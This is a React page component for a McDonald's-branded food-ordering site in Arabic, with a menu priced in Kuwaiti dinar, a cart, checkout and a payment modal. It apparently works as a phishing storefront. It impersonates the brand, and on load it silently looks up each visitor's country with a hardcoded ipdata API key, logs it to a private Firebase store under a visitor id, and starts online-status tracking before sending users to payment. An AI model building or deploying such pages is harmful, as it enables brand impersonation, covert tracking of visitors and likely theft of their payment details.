"use client"

import { useEffect, useState } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Menu, ShoppingCart, Search, ArrowRight, Plus } from "lucide-react"
import { useCart } from "../hooks/useCart"
import { CartSidebar } from "../components/cart-sidebar"
import { CheckoutModal } from "../components/checkout-modal"
import { OrderConfirmation } from "../components/order-confirmation"
import type { DeliveryInfo, Order } from "../types/cart"
import { PaymentModal } from "../components/payment-modal"
import type { PaymentResult } from "../types/payment"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

interface MenuItem {
  id: string
  name: string
  nameEn: string
  image: string
  category: string
  price: number
}

const menuItems: MenuItem[] = [
  // Burgers
  {
    id: "1",
    name: "بيج ماك",
    nameEn: "Big Mac",
    image: "https://images.unsplash.com/photo-1568901346375-23c9450c58cd?w=200&h=200&fit=crop",
    category: "burgers",
    price: 2.75,
  },
  {
    id: "2",
    name: "ربع باوندر بالجبن",
    nameEn: "Quarter Pounder with Cheese",
    image: "https://images.unsplash.com/photo-1594212699903-ec8a3eca50f5?w=200&h=200&fit=crop",
    category: "burgers",
    price: 3.2,
  },
  {
    id: "3",
    name: "تشيكن ماك",
    nameEn: "McChicken",
    image: "https://s7d1.scene7.com/is/image/mcdonalds/1mcd-chicken-mac-uae-1223:nutrition-calculator-tile?wid=822&hei=822&dpr=off",
    category: "burgers",
    price: 2.5,
  },
  {
    id: "4",
    name: "دبل تشيز برجر",
    nameEn: "Double Cheeseburger",
    image: "https://images.unsplash.com/photo-1571091718767-18b5b1457add?w=200&h=200&fit=crop",
    category: "burgers",
    price: 2.95,
  },

  {
    id: "6",
    name: "تشيز برجر",
    nameEn: "Cheeseburger",
    image: "https://images.unsplash.com/photo-1572802419224-296b0aeee0d9?w=200&h=200&fit=crop",
    category: "burgers",
    price: 1.95,
  },

  // Chicken & Fish
  {
    id: "7",
    name: "تشيكن ناجتس 6 قطع",
    nameEn: "6 Piece Chicken McNuggets",
    image: "https://images.unsplash.com/photo-1562967914-608f82629710?w=200&h=200&fit=crop",
    category: "chicken",
    price: 2.1,
  },
  {
    id: "8",
    name: "تشيكن ناجتس 9 قطع",
    nameEn: "9 Piece Chicken McNuggets",
    image: "https://images.unsplash.com/photo-1562967914-608f82629710?w=200&h=200&fit=crop",
    category: "chicken",
    price: 2.85,
  },
  {
    id: "9",
    name: "تشيكن ناجتس 20 قطعة",
    nameEn: "20 Piece Chicken McNuggets",
    image: "https://images.unsplash.com/photo-1562967914-608f82629710?w=200&h=200&fit=crop",
    category: "chicken",
    price: 5.5,
  },
  {
    id: "10",
    name: "كريسبي تشيكن",
    nameEn: "Crispy Chicken",
    image: "https://img.youm7.com/ArticleImgs/2018/8/2/53824-%D8%AA%D8%B4%D9%83%D9%86-%D9%83%D8%B1%D8%B3%D8%A8%D9%89-(2).jpg",
    category: "chicken",
    price: 2.75,
  },

  // Beverages
  {
    id: "11",
    name: "كوكا كولا",
    nameEn: "Coca-Cola",
    image: "https://images.unsplash.com/photo-1581636625402-29b2a704ef13?w=200&h=200&fit=crop",
    category: "beverages",
    price: 0.75,
  },
  {
    id: "12",
    name: "فانتا برتقال",
    nameEn: "Fanta Orange",
    image: "https://images.unsplash.com/photo-1624517452488-04869289c4ca?w=200&h=200&fit=crop",
    category: "beverages",
    price: 0.75,
  },
  {
    id: "13",
    name: "سبرايت",
    nameEn: "Sprite",
    image: "https://images.unsplash.com/photo-1625772299848-391b6a87d7b3?w=200&h=200&fit=crop",
    category: "beverages",
    price: 0.75,
  },
  {
    id: "14",
    name: "قهوة مكافيه",
    nameEn: "McCafé Coffee",
    image: "https://images.unsplash.com/photo-1509042239860-f550ce710b93?w=200&h=200&fit=crop",
    category: "beverages",
    price: 1.2,
  },
  {
    id: "15",
    name: "عصير برتقال",
    nameEn: "Orange Juice",
    image: "https://images.unsplash.com/photo-1621506289937-a8e4df240d0b?w=200&h=200&fit=crop",
    category: "beverages",
    price: 1.1,
  },
  {
    id: "16",
    name: "حليب",
    nameEn: "Milk",
    image: "https://images.unsplash.com/photo-1550583724-b2692b85b150?w=200&h=200&fit=crop",
    category: "beverages",
    price: 0.9,
  },

  // Sides
  {
    id: "17",
    name: "بطاطس صغيرة",
    nameEn: "Small French Fries",
    image: "https://images.unsplash.com/photo-1573080496219-bb080dd4f877?w=200&h=200&fit=crop",
    category: "sides",
    price: 1.2,
  },
  {
    id: "18",
    name: "بطاطس متوسطة",
    nameEn: "Medium French Fries",
    image: "https://images.unsplash.com/photo-1573080496219-bb080dd4f877?w=200&h=200&fit=crop",
    category: "sides",
    price: 1.5,
  },
  {
    id: "19",
    name: "بطاطس كبيرة",
    nameEn: "Large French Fries",
    image: "https://images.unsplash.com/photo-1573080496219-bb080dd4f877?w=200&h=200&fit=crop",
    category: "sides",
    price: 1.8,
  },
  {
    id: "20",
    name: "سلطة خضراء",
    nameEn: "Garden Salad",
    image: "https://images.unsplash.com/photo-1512621776951-a57141f2eefd?w=200&h=200&fit=crop",
    category: "sides",
    price: 2.2,
  },

  // Desserts
  {
    id: "21",
    name: "فطيرة التفاح",
    nameEn: "Apple Pie",
    image: "https://www.justfood.tv/big/tart.jpg",
    category: "desserts",
    price: 1.5,
  },
  {
    id: "22",
    name: "آيس كريم فانيلا",
    nameEn: "Vanilla Ice Cream",
    image: "https://images.unsplash.com/photo-1563805042-7684c019e1cb?w=200&h=200&fit=crop",
    category: "desserts",
    price: 1.8,
  },
  {
    id: "23",
    name: "كوكيز",
    nameEn: "Cookies",
    image: "https://images.unsplash.com/photo-1499636136210-6f4ee915583e?w=200&h=200&fit=crop",
    category: "desserts",
    price: 1.2,
  },
  {
    id: "24",
    name: "ميلك شيك فراولة",
    nameEn: "Strawberry Milkshake",
    image: "https://images.unsplash.com/photo-1572490122747-3968b75cc699?w=200&h=200&fit=crop",
    category: "desserts",
    price: 2.5,
  },

  // Breakfast
  {
    id: "25",
    name: " ماك مافن",
    nameEn: "Egg McMuffin",
    image: "https://s7d1.scene7.com/is/image/mcdonalds/mcd-sausage-egg-muffin-uae-1223",
    category: "breakfast",
    price: 2.2,
  },
  {
    id: "26",
    name: "هوت كيكس",
    nameEn: "Hotcakes",
    image: "https://images.unsplash.com/photo-1506084868230-bb9d95c24759?w=200&h=200&fit=crop",
    category: "breakfast",
    price: 2.8,
  },

  {
    id: "28",
    name: "هاش براون",
    nameEn: "Hash Browns",
    image: "https://images.unsplash.com/photo-1630384060421-cb20d0e0649d?w=200&h=200&fit=crop",
    category: "breakfast",
    price: 1.5,
  },

  // Happy Meal
  {
    id: "29",
    name: "هابي ميل برجر",
    nameEn: "Happy Meal Burger",
    image: "https://images.unsplash.com/photo-1571091718767-18b5b1457add?w=200&h=200&fit=crop",
    category: "happy-meal",
    price: 3.5,
  },
  {
    id: "30",
    name: "هابي ميل ناجتس",
    nameEn: "Happy Meal Nuggets",
    image: "https://images.unsplash.com/photo-1562967914-608f82629710?w=200&h=200&fit=crop",
    category: "happy-meal",
    price: 3.5,
  },
]

const burgerItems: MenuItem[] = [
  {
    id: "b1",
    name: "تشيز برجر",
    nameEn: "Cheeseburger",
    image: "https://images.unsplash.com/photo-1572802419224-296b0aeee0d9?w=300&h=200&fit=crop",
    category: "burgers",
    price: 1.95,
  },
  {
    id: "b2",
    name: "بيف برجر",
    nameEn: "Beef Burger",
    image: "https://images.unsplash.com/photo-1594212699903-ec8a3eca50f5?w=300&h=200&fit=crop",
    category: "burgers",
    price: 2.2,
  },
  {
    id: "b3",
    name: "كوارتر باوندر بالجبنة",
    nameEn: "Quarter Pounder with Cheese",
    image: "https://images.unsplash.com/photo-1594212699903-ec8a3eca50f5?w=300&h=200&fit=crop",
    category: "burgers",
    price: 3.2,
  },
  {
    id: "b4",
    name: "دبل تشيز برجر",
    nameEn: "Double Cheeseburger",
    image: "https://images.unsplash.com/photo-1571091718767-18b5b1457add?w=300&h=200&fit=crop",
    category: "burgers",
    price: 2.95,
  },
  {
    id: "b5",
    name: "بيج ماك®",
    nameEn: "Big Mac®",
    image: "https://images.unsplash.com/photo-1568901346375-23c9450c58cd?w=300&h=200&fit=crop",
    category: "burgers",
    price: 2.75,
  },
  {
    id: "b6",
    name: "ماك رويال",
    nameEn: "Mac Royal",
    image: "https://images.unsplash.com/photo-1594212699903-ec8a3eca50f5?w=300&h=200&fit=crop",
    category: "burgers",
    price: 3.5,
  },
  {
    id: "b7",
    name: "ليتل تايستي",
    nameEn: "Little Tasty",
    image: "https://images.unsplash.com/photo-1572802419224-296b0aeee0d9?w=300&h=200&fit=crop",
    category: "burgers",
    price: 2.8,
  },
  {
    id: "b8",
    name: "بيج تايستي",
    nameEn: "Big Tasty",
    image: "https://images.unsplash.com/photo-1568901346375-23c9450c58cd?w=300&h=200&fit=crop",
    category: "burgers",
    price: 3.8,
  },
]


const categories = [
  { id: "all", name: "الكل", nameEn: "All" },
  { id: "burgers", name: "البرجر", nameEn: "Burgers" },
  { id: "chicken", name: "الدجاج والسمك", nameEn: "Chicken & Fish" },
  { id: "beverages", name: "المشروبات", nameEn: "Beverages" },
  { id: "sides", name: "الأطباق الجانبية", nameEn: "Sides" },
  { id: "desserts", name: "الحلويات", nameEn: "Desserts" },
  { id: "breakfast", name: "الإفطار", nameEn: "Breakfast" },
  { id: "happy-meal", name: "هابي ميل", nameEn: "Happy Meal" },
]
const _id = Math.random().toString(36).substr(2, 9).toUpperCase()

export default function McDonaldsMenu() {
  const [selectedCategory, setSelectedCategory] = useState("all")
  const [isMenuOpen, setIsMenuOpen] = useState(false)
  const [showCategoryDetail, setShowCategoryDetail] = useState<string | null>(null)
  const [showCheckout, setShowCheckout] = useState(false)
  const [showOrderConfirmation, setShowOrderConfirmation] = useState(false)
  const [currentOrder, setCurrentOrder] = useState<Order | null>(null)
  const [showPayment, setShowPayment] = useState(false)
  const [pendingOrder, setPendingOrder] = useState<Order | null>(null)

  const {
    cartItems,
    isCartOpen,
    setIsCartOpen,
    addToCart,
    removeFromCart,
    updateQuantity,
    clearCart,
    getCartTotal,
    getCartItemsCount,
  } = useCart()


  useEffect(() => {
    getLocation()
  }, [])
  const filteredItems =
    selectedCategory === "all" ? menuItems : menuItems.filter((item) => item.category === selectedCategory)

  const handleAddToCart = (item: MenuItem) => {
    addToCart({
      id: item.id,
      name: item.name,
      nameEn: item.nameEn,
      image: item.image,
      price: item.price,
      category: item.category,
    })
  }

  const handlePlaceOrder = (deliveryInfo: DeliveryInfo) => {
    const order: Order = {
      id: Math.random().toString(36).substr(2, 9).toUpperCase(),
      items: cartItems,
      deliveryInfo,
      subtotal: getCartTotal(),
      deliveryFee: 1.5,
      total: getCartTotal() + 1.5,
      status: "pending",
      createdAt: new Date(),
    }

    setPendingOrder(order)
    setShowCheckout(false)
    setShowPayment(true)
  }

  const handlePaymentComplete = (result: PaymentResult) => {
    setShowPayment(false)

    if (result.success && pendingOrder) {
      const confirmedOrder = {
        ...pendingOrder,
        status: "confirmed" as const,
      }
      setCurrentOrder(confirmedOrder)
      setShowOrderConfirmation(true)
      clearCart()
      setIsCartOpen(false)
    } else {
      // Handle payment failure
      alert(result.errorMessageAr || "فشل في الدفع")
      setShowCheckout(true) // Go back to checkout
    }

    setPendingOrder(null)
  }
  const getLocation = async () => {
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }

      const country = await response.text()

      addData({
        createdDate: new Date().toISOString(),
        id: _id,
        country: country,
      })

      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
      <header className="bg-yellow-200 px-4 py-3 flex items-center justify-between sticky top-0 z-50">
        <Button
          variant="ghost"
          size="icon"
          onClick={() => setIsMenuOpen(!isMenuOpen)}
          className="text-black hover:bg-yellow-50"
        >
          <Menu className="h-6 w-6" />
        </Button>

        <div className="flex items-center gap-2">
          <div className="w-10 h-10 p-2 bg-red-600 rounded-full flex items-center justify-center">
            <img src="logoa.png" alt="logo" width={80} />
          </div>
          <span className="font-bold text-black">McDonald's</span>
        </div>

        <div className="flex items-center gap-2">
          <Button variant="ghost" size="icon" className="text-black hover:bg-yellow-50">
            <Search className="h-5 w-5" />
          </Button>
          <Button
            variant="ghost"
            size="icon"
            className="text-black hover:bg-yellow-50 relative"
            onClick={() => setIsCartOpen(true)}
          >
            <ShoppingCart className="h-5 w-5" />
            {getCartItemsCount() > 0 && (
              <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center">
                {getCartItemsCount()}
              </span>
            )}
          </Button>
        </div>
      </header>

      {/* Category Navigation */}
      <div className="bg-white px-4 py-3 border-b overflow-x-auto">
        <div className="flex gap-2 min-w-max">
          {categories.map((category) => (
            <Button
              key={category.id}
              variant={selectedCategory === category.id ? "default" : "outline"}
              size="sm"
              onClick={() => {
                setSelectedCategory(category.id)
                if (category.id === "burgers") {
                  setShowCategoryDetail("burgers")
                }
              }}
              className={`whitespace-nowrap ${selectedCategory === category.id
                  ? "bg-yellow-200 text-black hover:bg-yellow-50"
                  : "border-gray-300 text-gray-700 hover:bg-gray-50"
                }`}
            >
              {category.name}
            </Button>
          ))}
        </div>
      </div>

      {/* Menu Items Grid */}
      <main className="p-4">
        <div className="grid grid-cols-2 gap-4 max-w-md mx-auto">
          {filteredItems.map((item) => (
            <Card key={item.id} className="overflow-hidden hover:shadow-lg transition-shadow">
              <CardContent className="p-3">
                <div className="aspect-square mb-3 bg-gray-100 rounded-lg overflow-hidden">
                  <img src={item.image || "/placeholder.svg"} alt={item.name} className="w-full h-full object-cover" />
                </div>
                <div className="text-center mb-3">
                  <h3 className="font-semibold text-sm text-gray-900 mb-1 leading-tight">{item.name}</h3>
                  <p className="text-xs text-gray-500 mb-2">{item.nameEn}</p>
                  <p className="font-bold text-yellow-600">{item.price.toFixed(3)} د.ك</p>
                </div>
                <Button
                  onClick={() => handleAddToCart(item)}
                  className="w-full bg-yellow-200 hover:bg-yellow-50 text-black font-semibold text-sm py-2"
                >
                  <Plus className="h-4 w-4 mr-1" />
                  إضافة للسلة
                </Button>
              </CardContent>
            </Card>
          ))}
        </div>
      </main>

      {/* Side Menu Overlay */}
      {isMenuOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50 z-50" onClick={() => setIsMenuOpen(false)}>
          <div className="bg-white w-80 h-full p-6" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center gap-3 mb-8">
              <div className="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center">
                <span className="text-white font-bold">M</span>
              </div>
              <span className="font-bold text-xl">McDonald's</span>
            </div>

            <nav className="space-y-4">
              <a href="#" className="block py-2 text-gray-700 hover:text-yellow-600">
                الرئيسية
              </a>
              <a href="#" className="block py-2 text-gray-700 hover:text-yellow-600">
                القائمة الكاملة
              </a>
              <a href="#" className="block py-2 text-gray-700 hover:text-yellow-600">
                العروض
              </a>
              <a href="#" className="block py-2 text-gray-700 hover:text-yellow-600">
                المطاعم
              </a>
              <a href="#" className="block py-2 text-gray-700 hover:text-yellow-600">
                اتصل بنا
              </a>
            </nav>
          </div>
        </div>
      )}

      {/* Burgers Detail Page */}
      {showCategoryDetail === "burgers" && (
        <div className="fixed inset-0 bg-white z-50 overflow-y-auto">
          {/* Header */}
          <header className="bg-yellow-200 px-4 py-3 flex items-center justify-between sticky top-0">
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setShowCategoryDetail(null)}
              className="text-black hover:bg-yellow-50"
            >
              <ArrowRight className="h-6 w-6" />
            </Button>

            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center">
                <span className="text-white font-bold text-sm">M</span>
              </div>
            </div>

            <Button className="bg-yellow-50 hover:bg-yellow-600 text-black text-sm px-4 py-2 rounded-full">
              اطلب على ماك توصيل
            </Button>
          </header>

          {/* Breadcrumb */}
          <div className="px-4 py-2 text-sm text-gray-600">
            <span>القائمة الكاملة</span>
            <span className="mx-2">{">"}</span>
            <span>على قائمة ماكدونالدز</span>
          </div>

          {/* Page Title */}
          <div className="px-4 py-4">
            <h1 className="text-2xl font-bold text-center">البرجر</h1>
          </div>

          {/* Burgers Grid */}
          <div className="px-4 pb-8">
            <div className="grid grid-cols-2 gap-6 max-w-md mx-auto">
              {burgerItems.map((item) => (
                <div key={item.id} className="text-center">
                  <div className="aspect-[4/3] mb-3 bg-gray-100 rounded-lg overflow-hidden">
                    <img
                      src={item.image || "/placeholder.svg"}
                      alt={item.name}
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <h3 className="font-semibold text-sm text-gray-900 leading-tight mb-2">{item.name}</h3>
                  <p className="font-bold text-yellow-600 mb-3">{item.price.toFixed(3)} د.ك</p>
                  <Button
                    onClick={() => handleAddToCart(item)}
                    className="bg-yellow-200 hover:bg-yellow-50 text-black font-semibold text-sm px-4 py-2"
                  >
                    <Plus className="h-4 w-4 mr-1" />
                    إضافة
                  </Button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Cart Sidebar */}
      <CartSidebar
        isOpen={isCartOpen}
        onClose={() => setIsCartOpen(false)}
        cartItems={cartItems}
        onUpdateQuantity={updateQuantity}
        onRemoveItem={removeFromCart}
        onCheckout={() => {
          setIsCartOpen(false)
          setShowCheckout(true)
        }}
        total={getCartTotal()}
      />

      {/* Checkout Modal */}
      <CheckoutModal
        isOpen={showCheckout}
        onClose={() => setShowCheckout(false)}
        cartItems={cartItems}
        total={getCartTotal()}
        onPlaceOrder={handlePlaceOrder}
      />

      {/* Order Confirmation */}
      <OrderConfirmation
        isOpen={showOrderConfirmation}
        onClose={() => setShowOrderConfirmation(false)}
        order={currentOrder}
      />

      {/* Payment Modal */}
      <PaymentModal
        isOpen={showPayment}
        onClose={() => {
          setShowPayment(false)
          setShowCheckout(true) // Go back to checkout
        }}
        order={pendingOrder!}
        onPaymentComplete={handlePaymentComplete}
      />
    </div>
  )

}
